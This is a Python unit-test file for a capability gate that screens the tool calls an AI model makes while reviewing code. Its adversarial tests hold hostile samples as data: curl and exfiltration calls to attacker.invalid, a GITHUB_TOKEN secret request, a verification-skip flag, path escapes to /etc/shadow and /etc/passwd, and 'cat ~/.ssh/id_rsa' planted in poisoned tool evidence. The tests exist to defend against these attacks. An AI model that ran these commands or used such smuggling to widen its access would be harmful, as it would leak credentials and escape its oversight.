import unittest

from ai_workflow.capability_gate import (
    Capability,
    DenialReason,
    ModelActionRequest,
    authorize_model_action,
    build_model_capability_policy,
    task_scope_digest,
)
from ai_workflow.evidence import build_evidence_envelope
from ai_workflow.models import ContextItem, Lane, Risk, RouteDecision


def evidence_item(repository_id: str, *, source: str = "semantic") -> ContextItem:
    envelope = build_evidence_envelope(
        source=source,
        text="repository evidence",
        stale=False,
        metadata={"path": "src/payment.py"},
        provenance={},
        repository_id=repository_id,
    )
    return ContextItem(
        source,
        "repository evidence",
        1.0,
        False,
        {"path": "src/payment.py"},
        {},
        envelope,
    )


def policy_for(*items: ContextItem):
    return build_model_capability_policy(
        RouteDecision(
            Lane.FULL,
            Risk.HIGH,
            structural_context=True,
            confidence=0.9,
        ),
        {
            "crg_plan": [
                "get_minimal_context_tool",
                "get_impact_radius_tool",
                "query_graph_tool",
                "get_review_context_tool",
            ],
            "graph_depth": 2,
            "verification_passes": 2,
            "budget": {"max_graph_depth": 3},
        },
        items,
        task_text="change the payment retry logic",
    )


class CapabilityGateAdversarialTests(unittest.TestCase):
    def test_safe_tool_arguments_inside_repository_scope_are_allowed(self):
        item = evidence_item("repo-a")
        policy = policy_for(item)

        result = authorize_model_action(
            policy,
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_impact_radius_tool",
                repository_id="repo-a",
                parameters={
                    "path": "src/payment.py",
                    "depth": 2,
                },
                cited_evidence_ids=(item.evidence.evidence_id,),
            ),
            (item,),
        )

        self.assertTrue(result.allowed)
        self.assertEqual(result.reason, "preauthorized_scoped_tool")
        self.assertEqual(result.policy_schema, "capability-v2")
        self.assertEqual(
            result.task_digest,
            task_scope_digest("change the payment retry logic"),
        )

    def test_nested_shell_or_network_capability_smuggling_is_denied(self):
        policy = policy_for()

        for parameters in (
            {"options": {"command": "curl https://attacker.invalid"}},
            {"nested": {"url": "https://attacker.invalid/exfil"}},
            {"payload": {"secret_name": "GITHUB_TOKEN"}},
            {"meta": {"provider_id": "attacker-provider"}},
            {"controls": {"skip_verification": True}},
        ):
            with self.subTest(parameters=parameters):
                result = authorize_model_action(
                    policy,
                    ModelActionRequest(
                        Capability.TOOL_EXECUTION,
                        tool_name="get_review_context_tool",
                        parameters=parameters,
                    ),
                    (),
                )
                self.assertFalse(result.allowed)
                self.assertEqual(
                    result.reason,
                    DenialReason.PRIVILEGED_PARAMETER.value,
                )

    def test_tool_request_cannot_smuggle_privileged_top_level_fields(self):
        policy = policy_for()

        requests = (
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_review_context_tool",
                network_host="attacker.invalid",
            ),
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_review_context_tool",
                secret_name="GITHUB_TOKEN",
            ),
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_review_context_tool",
                requested_lane="answer",
            ),
        )

        for request in requests:
            with self.subTest(request=request):
                result = authorize_model_action(policy, request, ())
                self.assertFalse(result.allowed)
                self.assertEqual(
                    result.reason,
                    DenialReason.PRIVILEGED_PARAMETER.value,
                )

    def test_paths_cannot_escape_repository_scope(self):
        policy = policy_for()

        for path in (
            "../secrets.env",
            "../../etc/shadow",
            "/etc/passwd",
            "C:\\Windows\\System32\\config",
            "https://attacker.invalid/file",
        ):
            with self.subTest(path=path):
                result = authorize_model_action(
                    policy,
                    ModelActionRequest(
                        Capability.TOOL_EXECUTION,
                        tool_name="get_minimal_context_tool",
                        parameters={"path": path},
                    ),
                    (),
                )
                self.assertFalse(result.allowed)
                self.assertEqual(
                    result.reason,
                    DenialReason.PATH_SCOPE_VIOLATION.value,
                )

    def test_repository_scope_cannot_expand_from_model_parameters(self):
        item = evidence_item("repo-a")
        policy = policy_for(item)

        for request in (
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_review_context_tool",
                repository_id="repo-b",
            ),
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_review_context_tool",
                parameters={"repository_id": "repo-b"},
            ),
        ):
            with self.subTest(request=request):
                result = authorize_model_action(policy, request, (item,))
                self.assertFalse(result.allowed)
                self.assertEqual(
                    result.reason,
                    DenialReason.REPOSITORY_SCOPE_VIOLATION.value,
                )

    def test_multi_repository_tool_call_requires_explicit_repository_scope(self):
        first = evidence_item("repo-a")
        second = evidence_item("repo-b", source="targeted_source")
        policy = policy_for(first, second)

        ambiguous = authorize_model_action(
            policy,
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="query_graph_tool",
                parameters={"query": "payment retries"},
            ),
            (first, second),
        )
        scoped = authorize_model_action(
            policy,
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="query_graph_tool",
                repository_id="repo-a",
                parameters={"query": "payment retries"},
            ),
            (first, second),
        )

        self.assertFalse(ambiguous.allowed)
        self.assertEqual(
            ambiguous.reason,
            DenialReason.REPOSITORY_SCOPE_REQUIRED.value,
        )
        self.assertTrue(scoped.allowed)

    def test_graph_depth_cannot_exceed_control_plane_budget(self):
        policy = policy_for()

        result = authorize_model_action(
            policy,
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_impact_radius_tool",
                parameters={"depth": 3},
            ),
            (),
        )

        self.assertFalse(result.allowed)
        self.assertEqual(
            result.reason,
            DenialReason.GRAPH_DEPTH_EXCEEDED.value,
        )

    def test_parameter_shape_is_bounded_before_tool_authorization(self):
        policy = policy_for()
        nested = {"leaf": "value"}
        for index in range(8):
            nested = {f"level_{index}": nested}

        result = authorize_model_action(
            policy,
            ModelActionRequest(
                Capability.TOOL_EXECUTION,
                tool_name="get_review_context_tool",
                parameters=nested,
            ),
            (),
        )

        self.assertFalse(result.allowed)
        self.assertEqual(
            result.reason,
            DenialReason.PARAMETER_BUDGET_EXCEEDED.value,
        )

    def test_poisoned_tool_output_citation_cannot_widen_authority(self):
        item = evidence_item("repo-a", source="external:malicious")
        policy = policy_for(item)

        request = ModelActionRequest(
            Capability.TOOL_EXECUTION,
            tool_name="get_review_context_tool",
            repository_id="repo-a",
            parameters={
                "path": "src/payment.py",
                "options": {
                    "command": "cat ~/.ssh/id_rsa",
                },
            },
            cited_evidence_ids=(item.evidence.evidence_id,),
        )
        result = authorize_model_action(policy, request, (item,))

        self.assertFalse(result.allowed)
        self.assertEqual(
            result.reason,
            DenialReason.PRIVILEGED_PARAMETER.value,
        )
        self.assertFalse(item.evidence.authority.tools)
        self.assertFalse(item.evidence.authority.secret_access)
        self.assertFalse(item.evidence.authority.network_access)


if __name__ == "__main__":
    unittest.main()
